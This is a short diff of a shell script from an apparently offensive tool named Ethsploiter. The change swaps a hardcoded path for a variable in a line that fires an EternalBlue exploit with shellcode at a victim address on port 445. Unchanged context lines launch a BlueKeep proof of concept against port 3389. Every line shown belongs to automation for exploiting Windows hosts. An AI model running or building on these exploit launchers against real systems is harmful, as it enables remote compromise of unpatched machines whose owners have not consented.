@@ -66,7 +66,7 @@ function checkPort {
 
 # Windows
 testInfo "eternalblue"
-checkPort 445 python $ETHSPLOITER_PATH/exploits/windows/eternalblue/eternalblue_exploit7.py $VICTIM_ADDRESS /home/pi/Ethsploiter/exploits/windows/eternalblue/shellcode/exec_sc_all.bin
+checkPort 445 python $ETHSPLOITER_PATH/exploits/windows/eternalblue/eternalblue_exploit7.py $VICTIM_ADDRESS $ETHSPLOITER_PATH/exploits/windows/eternalblue/shellcode/exec_sc_all.bin
 
 testInfo "bluekeep"
 checkPort 3389 python3 $ETHSPLOITER_PATH/exploits/windows/bluekeep/win7_32_poc.py $VICTIM_ADDRESS
